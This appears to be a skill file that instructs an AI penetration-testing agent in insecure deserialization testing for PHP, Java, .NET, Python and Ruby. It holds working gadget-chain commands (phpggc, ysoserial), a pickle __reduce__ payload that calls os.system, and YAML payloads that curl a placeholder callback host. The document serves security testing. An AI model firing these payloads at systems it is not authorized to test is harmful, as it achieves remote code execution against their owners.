---
name: cypher-deserialization
description: Insecure Deserialization testing methodology covering PHP, Java, .NET, Python, Ruby, and Node.js deserialization gadgets, with ysoserial/ysoserial.net/phpggc usage and blind detection techniques.
version: 0.1.0
owasp: [A08:2021-Software and Data Integrity Failures]
cwe: [CWE-502]
finding_types: [PARAMETER, VULN_CANDIDATE, EXPLOIT_RESULT, SESSION]
destructiveness: high
tags: [web, deserialization, rce, gadget-chain]
---

# Cypher Deserialization Skill

Use this skill when the application deserializes user-supplied data: serialized objects in cookies, POST bodies, API parameters, or file uploads. Look for base64-encoded blobs, magic bytes, or framework-specific serialization formats.

## Format recognition

| Language | Magic Bytes / Format | Tool |
|----------|---------------------|------|
| PHP | `O:`, `a:`, `s:`, `C:` prefix | phpggc |
| Java | `ac ed 00 05` (hex), `rO0` (base64) | ysoserial, JNDI-Exploit-Kit |
| .NET | `00 01 00 00 00 ff ff ff ff` or `AAEAAAD/////` | ysoserial.net |
| Python (pickle) | `\x80\x04\x95` or `(cos\nsystem\n...` | pickle payloads |
| Ruby (Marshal) | `\x04\x08` | universal-rce |
| Node.js | `{"_bsontype":"function"...}` (BSON), `node-serialize`, `funcster` | node-specific |
| YAML (PyYAML) | `!!python/object/apply:subprocess.Popen` | PyYAML unsafe load |
| JSON (custom) | `{"__class__":"..."...}` | Language-specific |

## PHP deserialization

### Detection
- Look for `O:<length>:"<class>":<n>:{...}` format.
- Common locations: cookies (`laravel_session`, custom cookies), form fields (`data`, `state`), API bodies.
- Test by modifying a serialized object: change a parameter value and check if the application behaviour changes.

### Exploitation
1. Identify reachable classes with `__destruct()`, `__wakeup()`, `__toString()`, `__call()`, `__get()`, `__set()`.
2. Use **phpggc** to generate gadget chains:
   ```bash
   phpggc -l                    # list all gadget chains
   phpggc Laravel/RCE1 system id
   phpggc Symfony/RCE4 exec 'curl http://<dnslog>/pwn'
   ```
3. Test blind: use DNS/HTTP callbacks (`curl`, `wget`) as the command.
4. For framed applications (Laravel, Symfony, Drupal, WordPress), look for known gadget chains first.
5. If the target framework is unknown, try generic PHP deserialization payloads.

## Java deserialization

### Detection
- Look for base64 strings starting with `rO0ABX` (base64 of `ac ed 00 05`).
- Common locations: JSF view state (`javax.faces.ViewState`), cookies, hidden form fields, JWT claims, AMF/BlazeDS.
- Spring Framework `rememberMe` cookies.

### Exploitation
1. Use **ysoserial** to generate payloads:
   ```bash
   java -jar ysoserial.jar CommonsCollections6 'curl http://<dnslog>/java' | base64
   ```
2. Common gadget chains: CommonsCollections1-7, CommonsBeanutils1, Spring1, Jdk7u21, JRE8u20, ROME, Hibernate.
3. If one chain fails, try others — the classpath determines which are exploitable.
4. For JNDI injection chaining: use `JdbcRowSetImpl` or `JndiLookup` to trigger LDAP/RMI callback.

### Blind detection
- DNS callback via `URLDNS` gadget (no external dependency needed): `java -jar ysoserial.jar URLDNS http://<dnslog-host>/java-test`
- Timing: deserialization of deeply nested objects or large payloads may cause detectable latency.

## .NET deserialization

- **ysoserial.net**: Generate payloads for `BinaryFormatter`, `LosFormatter`, `ObjectStateFormatter`, `NetDataContractSerializer`, `FastJSON`.
- Look for `__Type` or `$type` in JSON.NET/Newtonsoft JSON.
- ViewState: `__VIEWSTATE` parameter in ASP.NET forms — test with `ysoserial.net -g ViewState`.

## Python deserialization

### Pickle
- Detection: Base64-encoded strings starting with `gASV` (base64 of pickle protocol header).
- Exploitation: `pickle.loads()` with `__reduce__`:
  ```python
  import pickle, os, base64
  class RCE:
      def __reduce__(self):
          return (os.system, ('curl http://<dnslog>/pickle',))
  payload = base64.b64encode(pickle.dumps(RCE())).decode()
  ```

### PyYAML
- `!!python/object/apply:subprocess.Popen [["id"]]` when `yaml.load()` is used without SafeLoader.
- `!!python/object/apply:os.system ["curl http://<dnslog>/yaml"]`

## Ruby deserialization

### Ruby Marshal
- Look for base64 strings starting with `BAhv` (base64 of `\x04\x08` prefix).
- Exploitation: `Gem::Installer`, `ERB`, ActiveSupport gadget chains.
- Universal RCE: `Marshal.load` with crafted `Gem::Specification` objects.

### Ruby YAML (Psych)
- `!ruby/object:Gem::Installer` gadget chains for `YAML.load()`.

## Evidence rules

- Save the generated payload and the exact command used to `/mnt/project/exploit/deser-<param>/`.
- For blind detection, save the OOB callback log showing the DNS/HTTP hit.
- Document the application/framework version, the gadget chain used, and whether it required specific classpath dependencies.
- If RCE is achieved, capture the shell session log.

## Prefix examples

```text
[cypher:finding type=VULN_CANDIDATE confidence=0.85 severity=high tags=web,deserialization,java artifacts=/mnt/project/exploit/deser-viewstate/ cleanup=none] JSF ViewState parameter is Java serialized object (base64 `rO0ABX` prefix). Target runs Mojarra 2.3 with CommonsCollections on classpath — likely exploitable.
```

```text
[cypher:finding type=EXPLOIT_RESULT confidence=0.98 severity=critical tags=web,deserialization,rce,php artifacts=/mnt/project/exploit/deser-cookie/shell.log cleanup=done] PHP deserialization in `data` cookie with Laravel/RCE1 gadget chain achieves `id` as `www-data`. Full shell log attached.
```

## Common false positives

- Serialized data is signed/HMAC'd — tampering breaks the signature and the payload is rejected. Check if the signature key can be leaked (hardcoded in source, in JS, in error messages).
- Serialized format is detected but is only used for internal IPC and never accepts user input — verify the data flow reaches user-controllable input.
- The framework is patched or uses an allowlist class loader (Java `ObjectInputFilter`) — test with a simple benign object first to confirm deserialization actually occurs.
